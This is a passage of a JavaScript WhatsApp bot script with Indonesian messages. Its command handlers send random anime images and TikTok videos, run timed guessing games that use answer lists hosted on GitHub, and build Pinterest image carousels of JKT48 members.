if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tataconn.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)];
KhaerulZx.sendMessage(m.sender, { image: { url: yeha }, caption : '© FInsii AI 2023 - 2024'}, { quoted: m })
}
break
case 'tiktokgirl':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var asupan = JSON.parse(fs.readFileSync('./src/media/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokghea':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var gheayubi = JSON.parse(fs.readFileSync('./src/media/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokbocil':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var bocil = JSON.parse(fs.readFileSync('./src/media/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknukhty':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var ukhty = JSON.parse(fs.readFileSync('./src/media/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoksantuy':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var santuy = JSON.parse(fs.readFileSync('./src/media/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokkayes':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var kayes = JSON.parse(fs.readFileSync('./src/media/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokpanrika':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var rikagusriani = JSON.parse(fs.readFileSync('./src/media/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktok2':
case 'tt2': {
    if (banned.includes(m.sender)) {
        return;
    }

    if (args.length == 0) return reply(`Contoh: ${prefix + command} link video tiktok`);
    const api = require('btch-downloader');
    if (!args[0]) return reply(`Masukan URL!\n\nContoh:\n${prefix + command} https://vm.tiktok.com/ZGJAmhSrp/`);
    if (!args[0].match(/tiktok/gi)) return reply(`URL Yang Tuan Berikan *Salah!!!*`);

    try {
        let maximus = await api.ttdl(args[0]);
        let caption = `乂 *T I K T O K  D O W N L O A D* 

• *Nama Video:* 
${maximus.title}

• *Nama Audio:* 
${maximus.title_audio}

©Khaerul`;
        await KhaerulZx.sendMessage(m.sender, { video: { url: maximus.video[0] }, caption: caption });
        await KhaerulZx.sendMessage(m.sender, { audio: { url: maximus.audio[0] }, mimetype: "audio/mpeg", ptt: true });

        if (m.isGroup) {
            reply(`Video telah dikirim ke chat pribadi @${m.sender.split('@')[0]}`, null, { mentions: [m.sender] });
        }

    } catch (e) {
        console.log(e);
        reply(`Terjadi kesalahan: ${e}`);
    }
}
break;
// Inisialisasi objek caklontong dan caklontong_desk
KhaerulZx.caklontong = 
KhaerulZx.caklontong || {};
KhaerulZx.caklontong_desk = 
KhaerulZx.caklontong_desk || {};

// Mendapatkan senderId dari m.sender
const senderId = m.sender.split('@')[0];

// Menangani jawaban permainan
if (KhaerulZx.caklontong.hasOwnProperty(senderId) && isCmd) {
    let jawaban = KhaerulZx.caklontong[senderId];
    let deskripsi = KhaerulZx.caklontong_desk[senderId];

    if (budy.toLowerCase() === jawaban) {
        KhaerulZx.sendMessage(m.chat, {
            image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, 
            caption: `🎮 Tebak Lontong 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lontong`
        }, { quoted: m });
        
        // Hapus data sesi permainan setelah dijawab benar
        delete KhaerulZx.caklontong[senderId];
        delete KhaerulZx.caklontong_desk[senderId];
    } else {
        console.log('*Jawaban Salah!*');
    }
}

// Kasus untuk memulai permainan
switch (command) {
    case 'caklontong': {
        if (!m.isGroup) return reply(mess.only.group); // Memastikan hanya bisa dimainkan di grup
        if (KhaerulZx.caklontong.hasOwnProperty(senderId)) {
            return reply("Masih Ada Sesi Yang Belum Diselesaikan!");
        }

        // Mengambil soal dari URL yang disediakan
        try {
            let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json');
            let result = anu[Math.floor(Math.random() * anu.length)];

            // Kirim soal dan mulai sesi permainan
            await KhaerulZx.sendText(from, `*Jawablah Pertanyaan Berikut :*\n${result.soal}\nWaktu : 60s`, m);
            KhaerulZx.caklontong[senderId] = result.jawaban.toLowerCase();
            KhaerulZx.caklontong_desk[senderId] = result.deskripsi;

            // Tunggu selama 60 detik
            await sleep(60000);

            // Jika waktu habis dan belum dijawab
            if (KhaerulZx.caklontong.hasOwnProperty(senderId)) {
                console.log("Jawaban: " + result.jawaban);
                KhaerulZx.sendMessage(m.chat, {
                    image: { url: 'https://telegra.ph/file/96bb6ca28d6ef7fea479f.jpg' }, 
                    caption: `Waktu Habis\nJawaban: ${KhaerulZx.caklontong[senderId]}\nDeskripsi: ${KhaerulZx.caklontong_desk[senderId]}\n\nIngin bermain? Ketik tebak lontong`
                }, { quoted: m });

                // Hapus sesi setelah waktu habis
                delete KhaerulZx.caklontong[senderId];
                delete KhaerulZx.caklontong_desk[senderId];
            }
        } catch (error) {
            console.error("Error fetching data: ", error);
            reply("Terjadi kesalahan saat mengambil data. Silakan coba lagi.");
        }
    }
    break; // Pastikan untuk menambahkan break di akhir case
}
case 'tebaktebakan': case 'tebak-tebakan': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isRegistered) return reply('Anda belum terdaftar, silahkan ketik .daftar')
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json')
let result = anu[Math.floor(Math.random() * anu.length)]
KhaerulZx.sendText(m.chat, `Jawablah Pertanyaan Berikut : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
    tebaktebakan[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.jawaban)
    KhaerulZx.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaktebakan[m.sender.split('@')[0]]}`, m)
    delete tebaktebakan[m.sender.split('@')[0]]
}}
break
case 'tekateki': case 'teka-teki':{
if (banned.includes(m.sender)) {
    return;
    }
if (!isRegistered) return reply(mess.regis)
  if (!m.isGroup) return reply('Fitur Khusus Group!\n\nSilahkan join grup bot : https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV')
	let timeout = 60000
	let users = global.db.data.users[m.sender]
	let poin = 10
	let id = m.chat
	if (id in KhaerulZx.tekateki) return reply('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*\nHadiah: ${poin} Limit\n\n*JAWAB DENGAN BENAR, LIMIT AKAN DIKURANGI JIKA ANDA TIDAK BISA MENJAWAB!*`.trim()
	KhaerulZx.tekateki[id] = [
	await reply(`${caption}`),
	json, poin,
	setTimeout(() => {
	if (KhaerulZx.tekateki[id]) 
users.limit -= 2
reply(`*GAME TEKA-TEKI*\n\nWaktu habis!\n Jawabannya adalah; *${json.jawaban}*\nLimit kamu dikurangi 2\nSisa limit kamu: *${db.data.users[sender].limit.toLocaleString()}*`)
	delete KhaerulZx.tekateki[id]
	 }, timeout)
	 ]
	}
	break
case 'susunkata': {
  if (banned.includes(m.sender)) {
    return;
  }
  if (!isRegistered) return reply(mess.regis);
  if (!m.isGroup) return reply('Fitur Khusus Group!\n\nSilahkan join grup bot : https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV');

  let timeout = 60000;
  let poin = 10;
  let id = m.chat;

  if (id in KhaerulZx.susunkata) return reply('Masih ada soal belum terjawab di chat ini');

  try {
    // Membaca file ./Game/susunkata.json
    let src = JSON.parse(fs.readFileSync('./Game/susunkata.json', 'utf-8'));
    let json = src[Math.floor(Math.random() * src.length)];
    let caption = `
    Soal: ${json.soal}
    Tipe: ${json.tipe}

    Waktu: *${(timeout / 1000).toFixed(2)} detik*
    Hadiah: ${poin} Limit
    `.trim();

    KhaerulZx.susunkata[id] = [
      await reply(`${caption}`),
      json,
      poin,
      setTimeout(() => {
        reply(`*GAME SUSUN KATA*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Ingin bermain lagi? ketik .susunkata`);
        delete KhaerulZx.susunkata[id];
      }, timeout)
    ];
  } catch (error) {
    console.error('Error reading susunkata data:', error);
    reply('Terjadi kesalahan saat mengambil data susunkata. Silakan coba lagi nanti.');
  }
  break;
}
case 'tebaklagu':
if (banned.includes(m.sender)) {
    return;
}
if (!isRegistered) return reply(mess.regis)
if (!m.isGroup) return reply('Fitur Khusus Group!\n\nSilahkan join grup bot : https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV!')
if (from in tebaklagu) return reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
var { soal, artis, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./Game/tebaklagu.json')));
console.log('Jawaban : '+jawaban)
if (jawaban.toLowerCase() == 'audio tidak ditemukan, silahkan request ulang!') return reply('Maaf terjadi kesalahan!')
var teks1 = `*GAME TEBAK LAGU*\n\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nArtist: ${artis}\nWaktu: ${gamewaktu} detik\n\nketik .nyerah untuk menyerah`

// Mengirim audio terlebih dahulu
await KhaerulZx.sendMessage(from, {audio: {url: soal}, mimetype: 'audio/mpeg', ptt: true}, {quoted: m})
    .then(res => {
        // Mengirim teks setelah audio dikirim
        KhaerulZx.sendMessage(from, {text: teks1}, {quoted: res});
    });

tebaklagu[from] = {
    soal: soal,
    jawaban: jawaban.toLowerCase(),
    hadiah: randomNomor(10, 20),
    waktu: setTimeout(function () {
        if (tebaklagu[from]) reply(`Waktu habis\nJawabannya adalah: ${tebaklagu[from].jawaban}`);
        delete tebaklagu[from];
    }, gamewaktu * 1000)
}
break
case 'tebakbendera':
if (banned.includes(m.sender)) {
    return;
}
if (!isRegistered) return reply(mess.regis)
if (!m.isGroup) return reply('Fitur Khusus Group!\n\nSilahkan join grup bot : https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV!')
if (from in tebakbendera) return reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./Game/tebakbendera.json')));
console.log('Jawaban : '+jawaban)
await reply(`*GAME TEBAK BENDERA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik\n\nketik .nyerah untuk menyerah`)
tebakbendera[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakbendera[from]) reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakbendera[from];
}, gamewaktu * 1000)
}
break
case 'tebakkata': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isRegistered) return reply(mess.regis)
if (!m.isGroup) return reply('Fitur Khusus Group!\n\nSilahkan join grup bot : https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV!')
  let timeout = 60000
  let id = m.chat
	if (id in KhaerulZx.tebakkata) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
 let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
 let caption = `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${json.soal}\nWaktu : 60s\nHadiah : 20 Limit`
 KhaerulZx.tebakkata[id] = [
	await reply(`${caption}`),
	json,
 setTimeout(() => {
 if (KhaerulZx.tebakkata[id]) 
 console.log("Jawaban: " + json.jawaban)
 reply(`Waktu Habis\nJawaban:  ${json.jawaban}\n\nIngin bermain? Ketik tebakkata`) 
 delete KhaerulZx.tebakkata[id]
 }, 60000)
 ]
}
break
//==================================================================
case 'tebaklirik':{
if (banned.includes(m.sender)) {
    return;
    }
  if (!isRegistered) return reply(mess.regis)
let users = global.db.data.users[m.sender]
	let timeout = 60000
	let poin = 10
	let id = m.chat
	if (id in KhaerulZx.tebaklirik) return reply('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
	
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Hadiah: ${poin} Limit
	`.trim()
	KhaerulZx.tebaklirik[id] = [
	await reply(`${caption}`),
	json, poin,
	setTimeout(() => {
	if (KhaerulZx.tebaklirik[id]) 
users.limit -= 2
reply(`*GAME TEBAK LIRIK*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Limit kamu dikurangi 2\n𖦹 Sisa Limit kamu: *${db.data.users[sender].limit.toLocaleString()}*`)
	delete KhaerulZx.tebaklirik[id]
	 }, timeout)
	 ]
	}
	break
case 'siapaaku': case 'siapakahaku': case 'siapakah-aku': case 'siapa-aku': {
if (banned.includes(m.sender)) {
    return;
    }
  if (!isRegistered) return reply(mess.regis)
if (!m.isGroup) return reply('Fitur Khusus Group!\n\nSilahkan join grup bot : https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV!')
  let users = global.db.data.users[m.sender]
	let timeout = 60000 
	let poin = 15
	let id = m.chat 
	if (id in KhaerulZx.siapaaku) return reply('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
	 
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Hadiah: ${poin} Limit
	`.trim()
	KhaerulZx.siapaaku[id] = [
	await reply(`${caption}`),
	json, poin,
	setTimeout(() => {
	if (KhaerulZx.siapaaku[id]) 
users.limit -= 2
reply(`*GAME SIAPAKAH AKU*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Limit kamu dikurangi 2\n𖦹 Sisa Limit kamu: *${db.data.users[sender].limit.toLocaleString()}*`)
	delete KhaerulZx.siapaaku[id]
	 }, timeout)
	 ]
	}
	break
case 'tebakkabupaten': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isRegistered) return reply(mess.regis)
  if (!m.isGroup) return reply('Fitur Khusus Group!\n\nSilahkan join grup bot : https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV')
if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkabupaten.json')
let result = anu[Math.floor(Math.random() * anu.length)]
KhaerulZx.sendImage(m.chat, result.url, `Silahkan Jawab Gambar Berikut\n\nWaktu : 60s`, m).then(() => {
    tebakkabupaten[m.sender.split('@')[0]] = result.title.toLowerCase()
})
await sleep(60000)
if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.title)
    KhaerulZx.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkabupaten[m.sender.split('@')[0]]}`, m)
    delete tebakkabupaten[m.sender.split('@')[0]]
}
}
break
case 'cls': {
if (banned.includes(m.sender)) {
    return;
    }
if (!m?.quoted) return reply('Reply with a sticker!')
let stiker = false
try {
let [packname, ...author] = text.split('|')
author = (author || []).join('|')
let mime = m?.quoted.mimetype || ''
if (!/webp/.test(mime)) throw 'Reply with a sticker!'
let img = await m?.quoted.download()
if (!img) throw 'Failed to download sticker!'
stiker = await addExifAvatar(img, packname || global.packname, author || global.author )
} catch (e) {
console.error(e)
if (Buffer.isBuffer(e)) stiker = e
else throw 'An error occurred: ' + e
} finally {
if (stiker) KhaerulZx.sendFile(m?.chat, stiker, 'wms.webp', '', m, false, { asSticker: true })
else throw 'Conversion failed'
}
}
break
case 'tebakgambar': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isRegistered) return reply(mess.regis)
  if (!m.isGroup) return reply('Fitur Khusus Group!\n\nSilahkan join grup bot : https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV!')
let timeout = 60000
let id = m.chat
if (id in KhaerulZx.tebakkata) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
async function tebakgambar() {
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 return {
      img: result.img,
      jawaban: result.jawaban,
      deskripsi: result.deskripsi
    }}
  let tos = await tebakgambar ()
  console.log(tos)
 let caption = `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${tos.deskripsi}\nWaktu : 60s\nHadiah : 5 limit`
 KhaerulZx.tebakgambar[id] = [
    await KhaerulZx.sendMessage(from, {caption: caption, image: {url: tos.img}}, {quoted: m}),
    tos,
 setTimeout(() => {
	if (KhaerulZx.tebakgambar[id])
 reply(`Waktu Habis\nJawaban:  ${tos.jawaban}\n\nIngin bermain? Ketik tebakgambar`)
 delete KhaerulZx.tebakgambar[id]
 }, 60000)
	 ]
}
break
case 'indira-jkt48': case 'indira': {
if (banned.includes(m.sender)) {
    return;
    }
await loading ()
    const createImage = async (url) => {
        const { imageMessage } = await baileys.generateWAMessageContent({
            image: {
                url
            }
        }, {
            upload: KhaerulZx.waUploadToServer
        });
        return imageMessage;
    };
    async function pinterest(query) {
        let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let json = await res.json();
        let data = json.resource_response.data.results;
        if (!data.length) reply(`Query "${query}" not found :/`);
        return data[~~(Math.random() * data.length)].images.orig.url;
    }
    const imageUrls = [];
    for (let i = 0; i < 5; i++) {
        const imageUrl = await pinterest('Indira Jkt48');
        imageUrls.push(imageUrl);
    }
    const cards = await Promise.all(imageUrls.map(async (url, index) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Image ${index + 1}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(url)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: []
        })
    })));
    const msg = baileys.generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `> Batas 5 photo`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, {});

    await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break
case 'michie-jkt48': case 'michie': {
if (banned.includes(m.sender)) {
    return;
    }
await loading ()
    const createImage = async (url) => {
        const { imageMessage } = await baileys.generateWAMessageContent({
            image: {
                url
            }
        }, {
            upload: KhaerulZx.waUploadToServer
        });
        return imageMessage;
    };
    async function pinterest(query) {
        let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let json = await res.json();
        let data = json.resource_response.data.results;
        if (!data.length) reply(`Query "${query}" not found :/`);
        return data[~~(Math.random() * data.length)].images.orig.url;
    }
    const imageUrls = [];
    for (let i = 0; i < 5; i++) {
        const imageUrl = await pinterest('Michie Jkt48');
        imageUrls.push(imageUrl);
    }
    const cards = await Promise.all(imageUrls.map(async (url, index) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Image ${index + 1}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(url)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: []
        })
    })));
    const msg = baileys.generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `> Batas 5 photo`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, {});

    await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break
case 'adel-jkt48': case 'adel': case 'nona-reva': {
if (banned.includes(m.sender)) {
    return;
    }
await loading ()
    const createImage = async (url) => {
        const { imageMessage } = await baileys.generateWAMessageContent({
            image: {
                url
            }
        }, {
            upload: KhaerulZx.waUploadToServer
        });
        return imageMessage;
    };
    async function pinterest(query) {
        let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let json = await res.json();
        let data = json.resource_response.data.results;
        if (!data.length) reply(`Query "${query}" not found :/`);
        return data[~~(Math.random() * data.length)].images.orig.url;
    }
    const imageUrls = [];
    for (let i = 0; i < 5; i++) {
        const imageUrl = await pinterest('Adel Jkt48');
        imageUrls.push(imageUrl);
    }
    const cards = await Promise.all(imageUrls.map(async (url, index) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Image ${index + 1}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(url)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [] 
        })
    })));
    const msg = baileys.generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `> Batas 5 photo`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, {});

    await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break
case 'freya-jkt48': case 'freya': {
if (banned.includes(m.sender)) {
    return;
    }
await loading ()
    const createImage = async (url) => {
        const { imageMessage } = await baileys.generateWAMessageContent({
            image: {
                url
            }
        }, {
            upload: KhaerulZx.waUploadToServer
        });
        return imageMessage;
    };
    async function pinterest(query) {
        let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let json = await res.json();
        let data = json.resource_response.data.results;
        if (!data.length) reply(`Query "${query}" not found :/`);
        return data[~~(Math.random() * data.length)].images.orig.url;
    }
    const imageUrls = [];
    for (let i = 0; i < 5; i++) {
        const imageUrl = await pinterest('Freya Jkt48');
        imageUrls.push(imageUrl);
    }
    const cards = await Promise.all(imageUrls.map(async (url, index) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Image ${index + 1}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(url)
        }),
